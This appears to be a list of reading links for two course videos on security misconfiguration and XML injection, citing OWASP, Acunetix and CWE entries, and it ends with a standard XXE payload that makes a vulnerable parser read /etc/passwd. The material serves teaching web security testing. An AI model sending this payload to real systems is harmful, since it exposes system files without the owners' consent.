# Video 6.2

* [A05:2021 – Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration)

# Video 6.3

* [[OWASP] Testing for XML Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)
* [What Are XML External Entity (XXE) Attacks](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)
* [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
* [CWE-756: Missing Custom Error Page](https://cwe.mitre.org/data/definitions/756.html)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>
```
